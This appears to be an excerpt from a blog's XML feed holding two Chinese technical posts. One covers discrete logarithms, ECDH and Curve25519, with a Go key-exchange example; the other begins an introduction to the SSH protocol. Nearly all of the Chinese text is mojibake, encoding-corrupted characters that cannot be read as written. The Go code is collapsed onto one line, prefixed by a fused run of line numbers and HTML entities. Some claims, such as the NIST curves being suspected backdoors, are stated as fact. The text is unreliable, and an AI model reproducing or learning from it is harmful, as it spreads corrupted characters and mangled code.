å¯ä»¥å¦‚ä¸‹å®šä¹‰ç¦»æ•£å¯¹æ•°ï¼šé¦–å…ˆå®šä¹‰ä¸€ä¸ªç´ æ•°pçš„åŸæ ¹ï¼Œä¸ºå…¶å„æ¬¡å¹‚äº§ç”Ÿä»1 åˆ°p-1çš„æ‰€æœ‰æ•´æ•°æ ¹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœaæ˜¯ç´ æ•°pçš„ä¸€ä¸ªåŸæ ¹ï¼Œé‚£ä¹ˆæ•°å€¼ a mod p,a2 mod p,â€¦,ap-1 mod p æ˜¯å„ä¸ç›¸åŒçš„æ•´æ•°ï¼Œå¹¶ä¸”ä»¥æŸç§æ’åˆ—æ–¹å¼ç»„æˆäº†ä»1åˆ°p-1çš„æ‰€æœ‰æ•´æ•°. å¯¹äºä¸€ä¸ªæ•´æ•°bå’Œç´ æ•°pçš„ä¸€ä¸ªåŸæ ¹aï¼Œå¯ä»¥æ‰¾åˆ°æƒŸä¸€çš„æŒ‡æ•°iï¼Œä½¿å¾— b = a^i mod p å…¶ä¸­0 â‰¤ i â‰¤ ï¼ˆp-1ï¼‰ æŒ‡æ•°iç§°ä¸ºbçš„ä»¥aä¸ºåŸºæ•°çš„æ¨¡pçš„ç¦»æ•£å¯¹æ•°æˆ–è€…æŒ‡æ•°.è¯¥å€¼è¢«è®°ä¸ºinda,p(b). ECDHå…¨ç§°æ˜¯Elliptic Curve Diffie-Hellman, æ˜¯DHç®—æ³•çš„åŠ å¼ºç‰ˆ, åŸºäºæ¤­åœ†æ›²çº¿éš¾é¢˜åŠ å¯†, ç°åœ¨æ˜¯ä¸»æµçš„å¯†é’¥äº¤æ¢ç®—æ³•ã€‚ECCæ˜¯å»ºç«‹åœ¨åŸºäºæ¤­åœ†æ›²çº¿çš„ç¦»æ•£å¯¹æ•°çš„éš¾åº¦, å¤§æ¦‚è¿‡ç¨‹å¦‚ä¸‹: ç»™å®šæ¤­åœ†æ›²çº¿ä¸Šçš„ä¸€ä¸ªç‚¹Pï¼Œä¸€ä¸ªæ•´æ•°kï¼Œæ±‚è§£Q=kPå¾ˆå®¹æ˜“ï¼›ç»™å®šä¸€ä¸ªç‚¹Pã€Qï¼ŒçŸ¥é“Q=kPï¼Œæ±‚æ•´æ•°kç¡®æ˜¯ä¸€ä¸ªéš¾é¢˜ã€‚ECDHå³å»ºç«‹åœ¨æ­¤æ•°å­¦éš¾é¢˜ä¹‹ä¸Š æ¤­åœ†æ›²çº¿ç®—æ³•å› å‚æ•°ä¸åŒæœ‰å¤šç§ç±»å‹, è¿™ä¸ªç½‘ç«™åˆ—å‡ºäº†ç°é˜¶æ®µé‚£äº›ECCæ˜¯ç›¸å¯¹å®‰å…¨çš„:æ¤­åœ†æ›²çº¿ç®—æ³•å®‰å…¨åˆ—è¡¨, è€Œcurve25519ä¾¿æ˜¯å…¶ä¸­çš„ä½¼ä½¼è€…ã€‚Curve25519/Ed25519/X25519æ˜¯è‘—åå¯†ç å­¦å®¶Daniel J. Bernsteinåœ¨2006å¹´ç‹¬ç«‹è®¾è®¡çš„æ¤­åœ†æ›²çº¿åŠ å¯†/ç­¾å/å¯†é’¥äº¤æ¢ç®—æ³•, å’Œç°æœ‰çš„ä»»ä½•æ¤­åœ†æ›²çº¿ç®—æ³•éƒ½å®Œå…¨ç‹¬ç«‹ã€‚ç‰¹ç‚¹æ˜¯ï¼š å®Œå…¨å¼€æ”¾è®¾è®¡: ç®—æ³•å„å‚æ•°çš„é€‰æ‹©ç›´æˆªäº†å½“ï¼Œéå¸¸æ˜ç¡®ï¼Œæ²¡æœ‰ä»»ä½•å¯ç–‘ä¹‹å¤„ï¼Œç›¸æ¯”ä¹‹ä¸‹ç›®å‰å¹¿æ³›ä½¿ç”¨çš„æ¤­åœ†æ›²çº¿æ˜¯NISTç³»åˆ—æ ‡å‡†ï¼Œæ–¹ç¨‹çš„ç³»æ•°æ˜¯ä½¿ç”¨æ¥å†ä¸æ˜çš„éšæœºç§å­ c49d3608 86e70493 6a6678e1 139d26b7 819f7e90 ç”Ÿæˆçš„ï¼Œéå¸¸å¯ç–‘ï¼Œç–‘ä¼¼åé—¨ï¼› é«˜å®‰å…¨æ€§ï¼š ä¸€ä¸ªæ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•å°±ç®—åœ¨æ•°å­¦ä¸Šæ˜¯å®‰å…¨çš„ï¼Œåœ¨å®ç”¨ä¸Šä¹Ÿå¹¶ä¸ä¸€å®šå®‰å…¨ï¼Œæœ‰å¾ˆå¤§çš„æ¦‚ç‡é€šè¿‡ç¼“å­˜ã€æ—¶é—´ã€æ¶æ„è¾“å…¥æ‘§æ¯å®‰å…¨æ€§ï¼Œè€Œ25519ç³»åˆ—æ¤­åœ†æ›²çº¿ç»è¿‡ç‰¹åˆ«è®¾è®¡ï¼Œå°½å¯èƒ½çš„å°†å‡ºé”™çš„æ¦‚ç‡é™åˆ°äº†æœ€ä½ï¼Œå¯ä»¥è¯´æ˜¯å®è·µä¸Šæœ€å®‰å…¨çš„åŠ å¯†ç®—æ³•ã€‚ä¾‹å¦‚ï¼Œä»»ä½•ä¸€ä¸ª32ä½éšæœºæ•°éƒ½æ˜¯ä¸€ä¸ªåˆæ³•çš„X25519å…¬é’¥ï¼Œå› æ­¤é€šè¿‡æ¶æ„æ•°å€¼æ”»å‡»æ˜¯ä¸å¯èƒ½çš„ï¼Œç®—æ³•åœ¨è®¾è®¡çš„æ—¶å€™åˆ»æ„é¿å…çš„æŸäº›åˆ†æ”¯æ“ä½œï¼Œè¿™æ ·åœ¨ç¼–ç¨‹çš„æ—¶å€™å¯ä»¥ä¸ä½¿ç”¨if ï¼Œå‡å°‘äº†ä¸åŒifåˆ†æ”¯ä»£ç æ‰§è¡Œæ—¶é—´ä¸åŒçš„æ—¶åºæ”»å‡»æ¦‚ç‡ï¼Œç›¸åï¼Œ NISTç³»åˆ—æ¤­åœ†æ›²çº¿ç®—æ³•åœ¨å®é™…åº”ç”¨ä¸­å‡ºé”™çš„å¯èƒ½æ€§éå¸¸å¤§ï¼Œè€Œä¸”å¯¹äºæŸäº›ç†è®ºæ”»å‡»çš„å…ç–«èƒ½åŠ›ä¸é«˜ï¼Œ Bernstein å¯¹å¸‚é¢ä¸Šæ‰€æœ‰çš„åŠ å¯†ç®—æ³•ä½¿ç”¨12ä¸ªæ ‡å‡†è¿›è¡Œäº†è€ƒå¯Ÿï¼Œ 25519æ˜¯å‡ ä¹å”¯ä¸€æ»¡è¶³è¿™äº›æ ‡å‡†çš„ http://t.cn/RMGmi1g ï¼› é€Ÿåº¦å¿«: 25519ç³»åˆ—æ›²çº¿æ˜¯ç›®å‰æœ€å¿«çš„æ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•ï¼Œæ€§èƒ½è¿œè¿œè¶…è¿‡NISTç³»åˆ—ï¼Œè€Œä¸”å…·æœ‰æ¯”P-256æ›´é«˜çš„å®‰å…¨æ€§ï¼› ä½œè€…åŠŸåº•æ·±åš: Daniel J. Bernsteinæ˜¯ä¸–ç•Œè‘—åçš„å¯†ç å­¦å®¶ï¼Œä»–åœ¨å¤§å­¦æ›¾ç»å¼€è®¾è¿‡ä¸€é—¨ UNIX ç³»ç»Ÿå®‰å…¨çš„è¯¾ç¨‹ç»™å­¦ç”Ÿï¼Œç»“æœä¸€å­¦æœŸä¸‹æ¥ï¼Œå‘ç°äº† UNIX ç¨‹åºä¸­çš„ 91 ä¸ªå®‰å…¨æ¼æ´ï¼›ä»–æ—©å¹´åœ¨ç¾å›½ä¾ç„¶ç¦æ­¢å‡ºå£åŠ å¯†ç®—æ³•æ—¶ï¼Œæ›¾å› ä¸ºæŠŠè‡ªå·±è®¾è®¡çš„åŠ å¯†ç®—æ³•å‘å¸ƒåˆ°ç½‘ä¸Šé­åˆ°äº†ç¾å›½æ”¿åºœçš„èµ·è¯‰ï¼Œä»–æœ¬äººæŠ—äº‰å…­å¹´ï¼Œæœ€åç¾å›½æ”¿åºœæ’¤é”€æ‰€æœ‰æŒ‡æ§ï¼Œç›®å‰å¦ä¸€ä¸ªéå¸¸ç«çš„é«˜æ€§èƒ½å®‰å…¨æµå¯†ç  ChaCha20 ä¹Ÿæ˜¯å‡ºè‡ª Bernstein ä¹‹æ‰‹ï¼› ä¸‹ä¸€ä»£çš„æ ‡å‡†: 25519ç³»åˆ—æ›²çº¿è‡ª2006å¹´å‘è¡¨ä»¥æ¥ï¼Œé™¤äº†å­¦æœ¯ç•Œæ— äººé—®æ´¥ï¼Œ 2013 å¹´çˆ±å¾·åÂ·æ–¯è¯ºç™»æ›å…‰æ£±é•œè®¡åˆ’åï¼Œè¯¥ç®—æ³•çªç„¶å¤§ç«ï¼Œå¤§é‡è½¯ä»¶ï¼Œå¦‚OpenSSHéƒ½è¿…é€Ÿå¢åŠ äº†å¯¹25519ç³»åˆ—çš„æ”¯æŒï¼Œå¦‚ä»Š25519å·²ç»æ˜¯å¤§åŠ¿æ‰€è¶‹ï¼Œå¯ç–‘çš„NISTæ›²çº¿è¿Ÿæ—©è¦é€€å‡ºæ¤­åœ†æ›²çº¿çš„å†å²èˆå°ï¼Œç›®å‰ï¼Œ RFCå¢åŠ äº†SSL/TLSå¯¹X25519å¯†é’¥äº¤æ¢åè®®çš„æ”¯æŒï¼Œè€Œæ–°ç‰ˆ OpenSSL 1.1ä¹ŸåŠ å…¥æ”¯æŒï¼Œæ˜¯æ‘†è„±è€å¤§å“¥çš„ç¬¬ä¸€æ­¥ï¼Œä¸‹ä¸€æ­¥æ˜¯å°† Ed25519åšä¸ºå¯é€‰çš„TLSè¯ä¹¦ç­¾åç®—æ³•ï¼Œå½»åº•æ‘†è„±NIST ä»£ç ç¤ºä¾‹è¿™é‡Œéœ€è¦æŒ‡å‡ºä¸‹golangçš„æ ‡å‡†åº“çš„cryptoé‡Œçš„æ¤­åœ†æ›²çº¿å®ç°äº†è¿™4ç§(ellipticæ–‡æ¡£): P224/P256/P384/P521, è€Œcurve25519æ˜¯å•ç‹¬å®ç°çš„, ä»–ä¸åœ¨æ ‡å‡†åº“ä¸­: golang.org/x/crypto/curve25519123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212package mainimport ( "crypto" "crypto/elliptic" "crypto/rand" "fmt" "io" "math/big" "golang.org/x/crypto/curve25519")// ECDH ç§˜é’¥äº¤æ¢ç®—æ³•çš„ä¸»æ¥å£type ECDH interface &#123; GenerateKey(io.Reader) (crypto.PrivateKey, crypto.PublicKey, error) Marshal(crypto.PublicKey) []byte Unmarshal([]byte) (crypto.PublicKey, bool) GenerateSharedSecret(crypto.PrivateKey, crypto.PublicKey) ([]byte, error)&#125;type ellipticECDH struct &#123; ECDH curve elliptic.Curve&#125;type ellipticPublicKey struct &#123; elliptic.Curve X, Y *big.Int&#125;type ellipticPrivateKey struct &#123; D []byte&#125;// NewEllipticECDH æŒ‡å®šä¸€ç§æ¤­åœ†æ›²çº¿ç®—æ³•ç”¨äºåˆ›å»ºä¸€ä¸ªECDHçš„å®ä¾‹// å…³äºæ¤­åœ†æ›²çº¿ç®—æ³•æ ‡å‡†åº“é‡Œé¢å®ç°äº†4ç§: è§crypto/ellipticfunc NewEllipticECDH(curve elliptic.Curve) ECDH &#123; return &amp;ellipticECDH&#123; curve: curve, &#125;&#125;// GenerateKey åŸºäºæ ‡å‡†åº“çš„NISTæ¤­åœ†æ›²çº¿ç®—æ³•ç”Ÿæˆç§˜é’¥å¯¹func (e *ellipticECDH) GenerateKey(rand io.Reader) (crypto.PrivateKey, crypto.PublicKey, error) &#123; var d []byte var x, y *big.Int var priv *ellipticPrivateKey var pub *ellipticPublicKey var err error d, x, y, err = elliptic.GenerateKey(e.curve, rand) if err != nil &#123; return nil, nil, err &#125; priv = &amp;ellipticPrivateKey&#123; D: d, &#125; pub = &amp;ellipticPublicKey&#123; Curve: e.curve, X: x, Y: y, &#125; return priv, pub, nil&#125;// Marshalç”¨äºå…¬é’¥çš„åºåˆ—åŒ–func (e *ellipticECDH) Marshal(p crypto.PublicKey) []byte &#123; pub := p.(*ellipticPublicKey) return elliptic.Marshal(e.curve, pub.X, pub.Y)&#125;// Unmarshalç”¨äºå…¬é’¥çš„ååºåˆ—åŒ–func (e *ellipticECDH) Unmarshal(data []byte) (crypto.PublicKey, bool) &#123; var key *ellipticPublicKey var x, y *big.Int x, y = elliptic.Unmarshal(e.curve, data) if x == nil || y == nil &#123; return key, false &#125; key = &amp;ellipticPublicKey&#123; Curve: e.curve, X: x, Y: y, &#125; return key, true&#125;// GenerateSharedSecret é€šè¿‡è‡ªå·±çš„ç§é’¥å’Œå¯¹æ–¹çš„å…¬é’¥åå•†ä¸€ä¸ªå…±äº«å¯†ç func (e *ellipticECDH) GenerateSharedSecret(privKey crypto.PrivateKey, pubKey crypto.PublicKey) ([]byte, error) &#123; priv := privKey.(*ellipticPrivateKey) pub := pubKey.(*ellipticPublicKey) x, _ := e.curve.ScalarMult(pub.X, pub.Y, priv.D) return x.Bytes(), nil&#125;// NewCurve25519ECDH ä½¿ç”¨å¯†ç å­¦å®¶Daniel J. Bernsteinçš„æ¤­åœ†æ›²çº¿ç®—æ³•:Curve25519æ¥åˆ›å»ºECDHå®ä¾‹// å› ä¸ºCurve25519ç‹¬ç«‹äºNISTä¹‹å¤–, æ²¡åœ¨æ ‡å‡†åº“å®ç°, éœ€è¦å•ç‹¬ä¸ºæœŸå®ç°ä¸€å¥—æ¥å£æ¥æ”¯æŒECDHfunc NewCurve25519ECDH() ECDH &#123; return &amp;curve25519ECDH&#123;&#125;&#125;type curve25519ECDH struct &#123; ECDH&#125;// GenerateKey åŸºäºcurve25519æ¤­åœ†æ›²çº¿ç®—æ³•ç”Ÿæˆç§˜é’¥å¯¹func (e *curve25519ECDH) GenerateKey(rand io.Reader) (crypto.PrivateKey, crypto.PublicKey, error) &#123; var pub, priv [32]byte var err error _, err = io.ReadFull(rand, priv[:]) if err != nil &#123; return nil, nil, err &#125; priv[0] &amp;= 248 priv[31] &amp;= 127 priv[31] |= 64 curve25519.ScalarBaseMult(&amp;pub, &amp;priv) return &amp;priv, &amp;pub, nil&#125;// å®ç°å…¬é’¥çš„åºåˆ—åŒ–func (e *curve25519ECDH) Marshal(p crypto.PublicKey) []byte &#123; pub := p.(*[32]byte) return pub[:]&#125;// å®ç°å…¬é’¥çš„ååºåˆ—åŒ–func (e *curve25519ECDH) Unmarshal(data []byte) (crypto.PublicKey, bool) &#123; var pub [32]byte if len(data) != 32 &#123; return nil, false &#125; copy(pub[:], data) return &amp;pub, true&#125;// å®ç°ç§˜é’¥åå•†æ¥å£func (e *curve25519ECDH) GenerateSharedSecret(privKey crypto.PrivateKey, pubKey crypto.PublicKey) ([]byte, error) &#123; var priv, pub, secret *[32]byte priv = privKey.(*[32]byte) pub = pubKey.(*[32]byte) secret = new([32]byte) curve25519.ScalarMult(secret, priv, pub) return secret[:], nil&#125;func test(e ECDH) &#123; var privKey1, privKey2 crypto.PrivateKey var pubKey1, pubKey2 crypto.PublicKey var pubKey1Buf, pubKey2Buf []byte var err error var ok bool var secret1, secret2 []byte // å‡†å¤‡2å¯¹ç§˜é’¥å¯¹,A: privKey1,pubKey1 B:privKey2,pubKey2 privKey1, pubKey1, err = e.GenerateKey(rand.Reader) if err != nil &#123; fmt.Println(err) &#125; privKey2, pubKey2, err = e.GenerateKey(rand.Reader) if err != nil &#123; fmt.Println(err) &#125; pubKey1Buf = e.Marshal(pubKey1) pubKey2Buf = e.Marshal(pubKey2) pubKey1, ok = e.Unmarshal(pubKey1Buf) if !ok &#123; fmt.Println("Unmarshal does not work") &#125; pubKey2, ok = e.Unmarshal(pubKey2Buf) if !ok &#123; fmt.Println("Unmarshal does not work") &#125; // A é€šè¿‡Bç»™çš„å…¬é’¥åå•†å…±äº«å¯†ç  secret1, err = e.GenerateSharedSecret(privKey1, pubKey2) if err != nil &#123; fmt.Println(err) &#125; // B é€šè¿‡Aç»™çš„å…¬é’¥åå•†å…±äº«å¯†ç  secret2, err = e.GenerateSharedSecret(privKey2, pubKey1) if err != nil &#123; fmt.Println(err) &#125; // A Båœ¨æ²¡æš´éœ²ç›´æ¥çš„ç§é’¥çš„æƒ…å†µä¸‹, åå•†å‡ºäº†ä¸€ä¸ªå…±äº«å¯†ç  fmt.Printf("The secret1 shared keys: %x\n", secret1) fmt.Printf("The secret2 shared keys: %x\n", secret2)&#125;func main() &#123; e1 := NewEllipticECDH(elliptic.P521()) e2 := NewCurve25519ECDH() test(e1) test(e2)&#125; æ€»ä½“ç»“è®ºä»¥ä¸Šç»¼è¿°äº†ä¸¤ç§åŠ å¯†æ–¹æ³•çš„åŸç†ï¼Œæ€»ä½“æ¥è¯´ä¸»è¦æœ‰ä¸‹é¢å‡ ä¸ªæ–¹é¢çš„ä¸åŒï¼š ç®¡ç†æ–¹é¢ï¼šå…¬é’¥å¯†ç ç®—æ³•åªéœ€è¦è¾ƒå°‘çš„èµ„æºå°±å¯ä»¥å®ç°ç›®çš„ï¼Œåœ¨å¯†é’¥çš„åˆ†é…ä¸Šï¼Œä¸¤è€…ä¹‹é—´ç›¸å·®ä¸€ä¸ªæŒ‡æ•°çº§åˆ«ï¼ˆä¸€ä¸ªæ˜¯nä¸€ä¸ªæ˜¯n2ï¼‰ã€‚æ‰€ä»¥ç§é’¥å¯†ç ç®—æ³•ä¸é€‚åº”å¹¿åŸŸç½‘çš„ä½¿ç”¨ï¼Œè€Œä¸”æ›´é‡è¦çš„ä¸€ç‚¹æ˜¯å®ƒä¸æ”¯æŒæ•°å­—ç­¾åã€‚ å®‰å…¨æ–¹é¢ï¼šç”±äºå…¬é’¥å¯†ç ç®—æ³•åŸºäºæœªè§£å†³çš„æ•°å­¦éš¾é¢˜ï¼Œåœ¨ç ´è§£ä¸Šå‡ ä¹ä¸å¯èƒ½ã€‚å¯¹äºç§é’¥å¯†ç ç®—æ³•ï¼Œåˆ°äº†AESè™½è¯´ä»ç†è®ºæ¥è¯´æ˜¯ä¸å¯èƒ½ç ´è§£çš„ï¼Œä½†ä»è®¡ç®—æœºçš„å‘å±•è§’åº¦æ¥çœ‹ã€‚å…¬é’¥æ›´å…·æœ‰ä¼˜è¶Šæ€§ã€‚ é€Ÿåº¦ä¸Šæ¥çœ‹ï¼šAESçš„è½¯ä»¶å®ç°é€Ÿåº¦å·²ç»è¾¾åˆ°äº†æ¯ç§’æ•°å…†æˆ–æ•°åå…†æ¯”ç‰¹ã€‚æ˜¯å…¬é’¥çš„100å€ï¼Œå¦‚æœç”¨ç¡¬ä»¶æ¥å®ç°çš„è¯è¿™ä¸ªæ¯”å€¼å°†æ‰©å¤§åˆ°1000å€ã€‚]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[è·³æ¿æœºç³»åˆ—(äºŒ)-sshåè®®åŸç†ç®€ä»‹]]></title>
    <url>%2F2017%2F02%2F16%2Fssh-protocol%2F</url>
    <content type="text"><![CDATA[SSHå¯¹äºå¤§å¤šæ•°äººæ¥è¯´åº”è¯¥å¹¶ä¸é™Œç”Ÿ, æ— è®ºä½ æ˜¯å¼€å‘è¿˜æ˜¯æµ‹è¯•è¿˜æ˜¯è¿ç»´, åªè¦ä½ éœ€è¦ç™»å½•ç±»UnixæœåŠ¡å™¨éƒ½ä¼šç”¨åˆ°, ä»–è¢«ç”¨æ¥æä¾›é“¾æ¥çš„å®‰å…¨ä¿éšœ, æ¯”å¦‚å¸¸è§çš„å®¢æˆ·ç«¯æœ‰å‘½ä»¤è¡Œå·¥å…·ssh, ä»¥åŠå‘¨è¾¹çš„å•†ä¸šå·¥å…·Xshellç­‰ã€‚åœ¨è¿™ç¯‡æ–‡ç« é‡Œæˆ‘ä»¬ä¸ä¼šæ•™ä½ å¦‚ä½•ä½¿ç”¨xshell, è€Œæ˜¯ä»åè®®å±‚é¢å…¨æ–°çš„è®¤è¯†ä¸‹sshã€‚ èƒŒæ™¯è™½ç„¶SSHä½¿ç”¨èµ·æ¥å¾ˆç®€å•, ä½†æ˜¯èƒŒåçš„åŸç†ç‰¹åˆ«ä¸ç®€å•,å…³äºä»¥ä¸‹é—®é¢˜, ä½ èƒ½å¦çŸ¥æ™“å…¶ç»†èŠ‚: SSHå¦‚ä½•ä¿è¯å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯é€šè¡Œçš„å®‰å…¨ SSHé‡‡ç”¨ä»€ä¹ˆåŠ å¯†åè®® SSHæ˜¯é€šè¿‡å¯¹ç§°åŠ å¯†è¿˜æ˜¯éå¯¹ç§°åŠ å¯†æ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹çš„å®‰å…¨ SSHå¦‚ä½•ä¿è¯æ•°æ®å®Œæ•´æ€§ SSHçš„å¯†ç è®¤è¯æ–¹å¼å’Œå¯†é’¥è®¤è¯æ–¹å¼åˆ†åˆ«å¦‚ä½•å®ç°ï¼Œæœ‰ä½•å·®å¼‚ ç®€ä»‹SSHå…¨ç§°Secure Shellæ˜¯ä¸€ç§å·¥ä½œåœ¨åº”ç”¨å±‚å’Œä¼ è¾“å±‚ä¸Šçš„å®‰å…¨åè®®ï¼Œèƒ½åœ¨éå®‰å…¨é€šé“ä¸Šå»ºç«‹å®‰å…¨é€šé“ã€‚æä¾›èº«ä»½è®¤è¯ã€å¯†é’¥æ›´æ–°ã€æ•°æ®æ ¡éªŒã€é€šé“å¤ç”¨ç­‰åŠŸèƒ½ï¼ŒåŒæ—¶å…·æœ‰è‰¯å¥½çš„å¯æ‰©å±•æ€§,ç”±èŠ¬å…°èµ«å°”è¾›åŸºå¤§å­¦ç ”ç©¶å‘˜Tatu YlÃ¶nen,äº1995å¹´æå‡ºï¼Œå…¶ç›®çš„æ˜¯ç”¨äºæ›¿ä»£éå®‰å…¨çš„Telnetã€rshã€rexecç­‰è¿œç¨‹Shellåè®®ã€‚ä¹‹åSSHå‘å±•äº†ä¸¤ä¸ªå¤§ç‰ˆæœ¬,SSH-1å’ŒSSH-2, å¼€æºå®ç°OpenSSHå¯¹2è€…éƒ½æ”¯æŒã€‚SSHçš„ä¸»è¦ç‰¹æ€§: åŠ å¯†: é¿å…æ•°æ®å†…å®¹æ³„æ¼ é€šä¿¡çš„å®Œæ•´æ€§: é¿å…æ•°æ®è¢«ç¯¡æ”¹ï¼Œä»¥åŠå‘é€æˆ–æ¥å—åœ°å€ä¼ªè£…(æ£€æŸ¥æ•°æ®æ˜¯å¦è¢«ç¯¡æ”¹ï¼Œæ•°æ®æ˜¯å¦æ¥è‡ªå‘é€è€…è€Œéæ”»å‡»è€…ï¼‰ SSH-2é€šè¿‡MD5å’ŒSHA-1å®ç°è¯¥åŠŸèƒ½ï¼ŒSSH-1ä½¿ç”¨CRC-32 è®¤è¯: è¯†åˆ«æ•°æ®å‘é€è€…å’Œæ¥æ”¶è€…èº«ä»½ å®¢æˆ·ç«¯éªŒè¯SSHæœåŠ¡ç«¯çš„èº«ä»½ï¼šé˜²æ­¢æ”»å‡»è€…ä»¿å†’SSHæœåŠ¡ç«¯èº«ä»½ï¼Œé¿å…ä¸­ä»‹äººæ”»å‡»å’Œé‡å®šå‘è¯·æ±‚çš„æ”»å‡»ï¼›OpenSSHé€šè¿‡åœ¨know-hostsä¸­å­˜å‚¨ä¸»æœºåå’Œhost keyå¯¹æœåŠ¡ç«¯èº«ä»½è¿›è¡Œè®¤è¯ æœåŠ¡ç«¯éªŒè¯è¯·æ±‚è€…èº«ä»½ï¼šæä¾›å®‰å…¨æ€§è¾ƒå¼±çš„ç”¨æˆ·å¯†ç æ–¹å¼ï¼Œå’Œå®‰å…¨æ€§æ›´å¼ºçš„per-user public-key signaturesï¼›æ­¤å¤–SSHè¿˜æ”¯æŒä¸ç¬¬ä¸‰æ–¹å®‰å…¨æœåŠ¡ç³»ç»Ÿçš„é›†æˆï¼Œå¦‚Kerberosç­‰ æˆæƒ: ç”¨æˆ·è®¿é—®æ§åˆ¶ å®‰å…¨éš§é“: è½¬å‘æˆ–è€…ä¸ºåŸºäºTCP/IPçš„å›è¯æä¾›åŠ å¯†éš§é“, æ¯”å¦‚é€šè¿‡SSHä¸ºTelnetã€FTPç­‰æä¾›é€šä¿¡å®‰å…¨ä¿éšœï¼Œæ”¯æŒä¸‰ç§ç±»å‹çš„Forwardingæ“ä½œï¼šPort Forwardingï¼›X Forwardingï¼›Agent Forwarding é€šè¿‡ä½¿ç”¨SSHï¼Œä½ å¯ä»¥æŠŠæ‰€æœ‰ä¼ è¾“çš„æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œè¿™æ ·â€ä¸­é—´äººâ€è¿™ç§æ”»å‡»æ–¹å¼å°±ä¸å¯èƒ½å®ç°äº†ï¼Œè€Œä¸”ä¹Ÿèƒ½å¤Ÿé˜²æ­¢DNSæ¬ºéª—å’ŒIPæ¬ºéª—ã€‚ä½¿ç”¨SSHï¼Œè¿˜æœ‰ä¸€ä¸ªé¢å¤–çš„å¥½å¤„å°±æ˜¯ä¼ è¾“çš„æ•°æ®æ˜¯ç»è¿‡å‹ç¼©çš„ï¼Œæ‰€ä»¥å¯ä»¥åŠ å¿«ä¼ è¾“çš„é€Ÿåº¦ã€‚SSHæœ‰å¾ˆå¤šåŠŸèƒ½ï¼Œå®ƒæ—¢å¯ä»¥ä»£æ›¿Telnetï¼Œåˆå¯ä»¥ä¸ºFTPã€PoPã€ç”šè‡³ä¸ºPPPæä¾›ä¸€ä¸ªå®‰å…¨çš„â€é€šé“â€ã€‚ å®‰å…¨ç›¸å…³åœ¨SSHä¸­æ¶‰åŠåˆ°å¾ˆå¤šåŠ å¯†ç®—æ³•, å…³äºåŠ å¯†ç®—æ³•çš„ç›¸å…³çŸ¥è¯†ä¹‹å‰å·²ç»å†™è¿‡ä¸€éåšå®¢åšä¸“é—¨ä»‹ç»:å¯†ç å­¦ç®€ä»‹ä¸Golangçš„åŠ å¯†åº“Cryptoçš„ä½¿ç”¨, ä»¥ä¸‹æ˜¯ä¸€ä¸ªæ€»ç»“æ€§çš„æè¿°: å¯¹ç§°åŠ å¯†: é«˜æ•ˆï¼Œä½†å®‰å…¨æ€§ç›¸å¯¹è¾ƒä½ï¼ŒKeyçš„åˆ†å‘å°¤å…¶ä¸æ–¹ä¾¿, ä¸»è¦ç”¨äºæ•°æ®ä¼ è¾“çš„åŠ å¯†(sessionåŠ å¯†), å¸¸ç”¨AESç³»åˆ— éå¯¹ç§°åŠ å¯†: å®‰å…¨ï¼Œä½†æ•ˆç‡ä½ï¼Œä¸é€‚åˆå¤§è§„æ¨¡è¿›è¡Œæ•°æ®çš„åŠ å¯†å’Œè§£å¯†æ“ä½œ, ä¸»è¦ç”¨äºç§˜é’¥äº¤æ¢ç®—æ³•è¿‡ç¨‹ä¸­ç”¨æ¥åå•†Keyå’Œåœ¨æ•°å­—ç­¾åæ—¶ç”¨æ¥éªŒè¯èº«ä»½, å¸¸ç”¨çš„æ˜¯RSA/ECDSA ç§˜é’¥äº¤æ¢ç®—æ³•: ç”¨äºåå•†å¯¹ç§°åŠ å¯†çš„å¯†ç , ECDHç”¨çš„æ¯”è¾ƒå¤š æ•£åˆ—ç®—æ³•: ç”¨äºç¡®ä¿æ•°æ®ä¼ è¾“è¿‡ç¨‹ä¸­çš„å®Œæ•´æ€§, ä¸ºäº†å®‰å…¨ä¸€èˆ¬ä½¿ç”¨Hmacåœ¨golangçš„sshåŒ…ä¸­ä½¿ç”¨ECDHçš„cure25519çš„è¿›è¡Œå¯†ç çš„äº¤æ¢, äº¤æ¢åçš„å¯†ç ä½¿ç”¨AESæ¥åŠ å¯†æ•°æ®. å¦‚æœä½¿ç”¨å¯†é’¥ç™»å½•çš„è¯,ä¸€èˆ¬ä½¿ç”¨ECDSAè¿›è¡Œæ•°å­—ç­¾å. åè®®ç»„æˆä»ä¸Šå›¾ä¸­å¯ä»¥çœ‹å‡ºSSHä¸»è¦æœ‰ä¸‰éƒ¨åˆ†ç»„æˆ: ä¼ è¾“å±‚åè®®, ç”¨æˆ·è®¤è¯åè®®, è¿æ¥åè®® ä¼ è¾“å±‚åè®®[SSH-TRANS]ä¹Ÿå«:The Transport Layer Protocol, æä¾›äº†æœåŠ¡å™¨è®¤è¯ï¼Œä¿å¯†æ€§åŠå®Œæ•´æ€§ã€‚æ­¤å¤–å®ƒæœ‰æ—¶è¿˜æä¾›å‹ç¼©åŠŸèƒ½ã€‚ SSH-TRANSé€šå¸¸è¿è¡Œåœ¨TCP/IPè¿æ¥ä¸Šï¼Œä¹Ÿå¯èƒ½ç”¨äºå…¶å®ƒå¯é æ•°æ®æµä¸Šã€‚ SSH-TRANSæä¾›äº†å¼ºåŠ›çš„åŠ å¯†æŠ€æœ¯ã€å¯†ç ä¸»æœºè®¤è¯åŠå®Œæ•´æ€§ä¿æŠ¤ã€‚è¯¥åè®®ä¸­çš„è®¤è¯åŸºäºä¸»æœºï¼Œå¹¶ä¸”è¯¥åè®®ä¸æ‰§è¡Œç”¨æˆ·è®¤è¯ã€‚æ›´é«˜å±‚çš„ç”¨æˆ·è®¤è¯åè®®å¯ä»¥è®¾è®¡ä¸ºåœ¨æ­¤åè®®ä¹‹ä¸Šã€‚ ç”¨æˆ·è®¤è¯åè®®[SSH-USERAUTH]ä¹Ÿå«:The User Authentication Protocol, 